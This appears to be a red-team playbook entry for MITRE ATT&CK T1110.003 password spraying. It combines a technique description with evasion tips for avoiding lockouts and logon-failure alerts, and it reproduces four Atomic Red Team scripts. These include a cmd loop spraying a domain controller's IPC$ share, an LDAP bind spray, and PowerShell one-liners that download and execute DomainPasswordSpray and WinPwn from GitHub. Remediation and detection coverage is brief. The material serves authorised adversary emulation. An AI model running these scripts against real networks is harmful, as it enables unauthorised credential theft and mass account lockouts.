---
name: "T1110.003_password-spraying"
description: "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1110.003
  - credential-access
  - containers
  - esxi
  - iaas
  - identity-provider
  - linux
  - network-devices
  - office-suite
  - saas
  - windows
  - macos
  - sub-technique
technique_id: "T1110.003"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Containers
  - ESXi
  - IaaS
  - Identity Provider
  - Linux
  - Network Devices
  - Office Suite
  - SaaS
  - Windows
  - macOS
mitre_url: "https://attack.mitre.org/techniques/T1110/003"
tech_stack:
  - containers
  - esxi
  - cloud
  - identity
  - linux
  - network devices
  - office
  - saas
  - windows
  - macos
cwe_ids:
  - CWE-522
chains_with:
  - T1110
  - T1110.001
  - T1110.002
  - T1110.004
prerequisites:
  - T1110
severity_boost:
  T1110: "Chain with T1110 for deeper attack path"
  T1110.001: "Chain with T1110.001 for deeper attack path"
  T1110.002: "Chain with T1110.002 for deeper attack path"
---

# T1110.003 Password Spraying

> **Sub-technique of:** T1110

## High-Level Description

Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

- SSH (22/TCP)
- Telnet (23/TCP)
- FTP (21/TCP)
- NetBIOS / SMB / Samba (139/TCP & 445/TCP)
- LDAP (389/TCP)
- Kerberos (88/TCP)
- RDP / Terminal Services (3389/TCP)
- HTTP/HTTP Management Services (80/TCP & 443/TCP)
- MSSQL (1433/TCP)
- Oracle (1521/TCP)
- MySQL (3306/TCP)
- VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.

In order to avoid detection thresholds, adversaries may deliberately throttle password spraying attempts to avoid triggering security alerting. Additionally, adversaries may leverage LDAP and Kerberos authentication attempts, which are less likely to trigger high-visibility events such as Windows "logon failure" event ID 4625 that is commonly triggered by failed SMB connection attempts.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Containers, ESXi, IaaS, Identity Provider, Linux, Network Devices, Office Suite, SaaS, Windows, macOS

## What to Check

- [ ] Identify if Password Spraying technique is applicable to target environment
- [ ] Check Containers systems for indicators of Password Spraying
- [ ] Check ESXi systems for indicators of Password Spraying
- [ ] Check IaaS systems for indicators of Password Spraying
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Password Spray all Domain Users

CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5

**Supported Platforms:** windows

```cmd
@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
```

**Dependencies:**

- List of domain users to password spray must exits at %temp%\users.txt

### Atomic Test 2: Password Spray (DomainPasswordSpray)

Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain

https://github.com/dafthack/DomainPasswordSpray

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
```

### Atomic Test 3: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)

Attempt to brute force all Active Directory domain users with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos

Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)

**Supported Platforms:** windows

```powershell
if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = '#{password}'

  $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host " [-] Attempting ${password} on account ${user}."
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] ${user}:${password} are valid credentials!"
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host "End of password spraying"
```

### Atomic Test 5: WinPwn - DomainPasswordSpray Attacks

DomainPasswordSpray Attacks technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Password Spraying by examining the target platforms (Containers, ESXi, IaaS).

2. **Assess Existing Defenses**: Review whether mitigations for T1110.003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1032 Multi-factor Authentication

Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.

### M1027 Password Policies

Refer to NIST guidelines when creating password policies.

### M1036 Account Use Policies

Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies.

## Detection

### Distributed Password Spraying via Authentication Failures Across Multiple Accounts

## Risk Assessment

| Finding                                | Severity | Impact            |
| -------------------------------------- | -------- | ----------------- |
| Password Spraying technique applicable | High     | Credential Access |

## CWE Categories

| CWE ID  | Title                                |
| ------- | ------------------------------------ |
| CWE-522 | Insufficiently Protected Credentials |

## References

- [Trimarc Detecting Password Spraying](https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing)
- [Microsoft Storm-0940](https://www.microsoft.com/en-us/security/blog/2024/10/31/chinese-threat-actor-storm-0940-uses-credentials-from-password-spray-attacks-from-a-covert-network/)
- [BlackHillsInfosec Password Spraying](http://www.blackhillsinfosec.com/?p=4645)
- [US-CERT TA18-068A 2018](https://www.us-cert.gov/ncas/alerts/TA18-086A)
- [Atomic Red Team - T1110.003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1110.003)
- [MITRE ATT&CK - T1110.003](https://attack.mitre.org/techniques/T1110/003)
